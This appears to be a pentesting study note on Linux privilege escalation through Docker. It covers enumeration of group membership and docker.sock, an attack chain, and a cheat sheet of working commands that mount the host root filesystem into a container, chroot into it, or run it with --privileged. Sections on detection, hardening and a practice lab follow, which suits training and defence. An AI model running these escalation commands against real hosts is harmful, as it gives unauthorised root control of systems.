---
id: deep-study-linux-privilege-escalation-docker
tags: [htb, pentesting, linux, privilege-escalation, containers, docker]
date: 2026-03-21
topic: Docker
type: deep-study
owner: vault-agent
status: draft
version: 1.0
last_updated: 2026-03-21
category: linux-privilege-escalation
---

# Docker

## Related Topics

- [Linux Privilege Escalation](README.md)
- [Containers (LXC/LXD Privilege Escalation)](containers-lxd-privesc.md)
- [Privileged Groups](privileged-groups.md)

## Concept Overview

Docker is a containerization platform built around a client/daemon architecture.
It packages applications and dependencies into portable runtime units called containers.

Because containers share the host kernel, Docker misconfigurations can become high-impact
privilege-escalation paths in penetration tests.

## Threat Context

- Attacker objective: move from a constrained shell to host-level privileges.
- Foothold assumption: shell access on host or inside a containerized workload.
- Boundary targeted: container/runtime isolation and daemon trust model.

## Environment Snapshot

- Typical host: Linux server running Docker workloads.
- Common weaknesses: user in `docker` group, writable `docker.sock`, overly privileged containers.
- Constraints: missing tooling, partial egress, non-standard socket paths.

## Quick Navigation

- [Internal Mechanics](#internal-mechanics)
- [Enumeration Checklist](#enumeration-checklist)
- [Attack Methodology](#attack-methodology)
- [Decision Workflow](#decision-workflow)
- [Attack Chain](#attack-chain)
- [Practical Example](#practical-example)
- [Command Cheat Sheet](#command-cheat-sheet)
- [Real World Scenario](#real-world-scenario)
- [Detection Indicators](#detection-indicators)
- [Defensive Perspective](#defensive-perspective)
- [Practice Lab Idea](#practice-lab-idea)

## Internal Mechanics

Docker consists of:

- **Docker Daemon**: manages images, containers, storage, and networking.
- **Docker Client**: sends commands to the daemon over a Unix socket or API.

The daemon can pull images, create containers, attach volumes, and expose network ports.
If an attacker can talk to the daemon, they can usually perform privileged operations.

## Enumeration Checklist

```bash
id
groups
which docker
ls -l /var/run/docker.sock
find / -name docker.sock 2>/dev/null
docker ps
docker image ls
```

Focus on:

- membership in `docker` group
- writable socket access (default or non-standard path)
- ability to run containers with mounts/privileged flags

## Attack Methodology

1. Confirm Docker control path (`docker` group or writable socket).
2. Enumerate available images and running containers.
3. Launch a container with host-root mount.
4. Chroot or browse mounted host filesystem.
5. Extract credentials/keys and escalate to host root.

## Decision Workflow

1. Run `id` and `groups`.
2. If in `docker` group, attempt standard Docker CLI actions.
3. If not, test socket permissions (`/var/run/docker.sock` and alternate paths).
4. If socket access works, run container with `-v /:/mnt`.
5. Validate host filesystem access and pivot to root context.

## Attack Timeline

T0 -> foothold obtained
T1 -> Docker privilege condition validated
T2 -> exploitable image/context selected
T3 -> host-root mount executed through container
T4 -> host credential material or root access obtained

## Attack Chain

1. Discover Docker trust boundary weakness.
2. Prove daemon interaction ability.
3. Create/abuse container with dangerous mount privileges.
4. Access host filesystem from container context.
5. Escalate privileges on host.

## Practical Example

```bash
# enumerate daemon access
id
ls -l /var/run/docker.sock

# enumerate running containers
docker -H unix:///var/run/docker.sock ps

# mount host root into temporary container and enter host FS
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

If default socket path is unavailable, test alternate locations from target context
such as `/app/docker.sock`.

## Evidence and Artifacts

- Docker daemon/API command history showing unusual run flags.
- Container start events with host root mounts (`-v /:/...`).
- Interactive shells spawned via `docker exec`.
- Access to sensitive host paths from containerized process context.

## Command Cheat Sheet

```bash
# baseline
id && groups
which docker

# sockets
ls -l /var/run/docker.sock
find / -name docker.sock 2>/dev/null

# daemon interaction
docker ps
docker image ls
docker -H unix:///app/docker.sock ps

# host mount abuse
docker run --rm -d --privileged -v /:/hostsystem <image>
docker exec -it <container_id> /bin/bash
ls /hostsystem/root
```

## Real World Scenario

In real environments, Docker is frequently deployed for CI/CD, internal apps,
and developer workflows. Teams often add users to `docker` group for convenience.
This operational shortcut can silently grant root-equivalent host control if the
account is compromised.

## Detection Indicators

- unexpected container creation from non-admin user contexts
- container launches with `--privileged` or host-root mounts
- daemon socket access from atypical processes/paths
- unusual `docker exec` activity on production hosts

## Defensive Perspective

- treat `docker` group membership as privileged access
- enforce least privilege for daemon socket permissions
- block privileged container launches where not required
- monitor and alert on dangerous run flags and host mounts

## Recovery and Hardening Path

- remove unnecessary users from `docker` group
- restrict socket exposure and file permissions
- disable direct daemon access from untrusted workloads
- add policy controls for mount paths and privileged mode

## Practice Lab Idea

1. Build a Linux VM with Docker installed.
2. Add one low-privileged user to `docker` group.
3. Obtain shell as that user and enumerate Docker trust paths.
4. Mount host root via a container and verify privilege impact.
5. Implement hardening controls and re-test attack path.

## Key Insights

- Docker control paths are often root-equivalent in practice.
- Socket exposure is as dangerous as direct sudo misconfiguration.
- Host-root mounts are a fast, reliable escalation route in labs and CTFs.
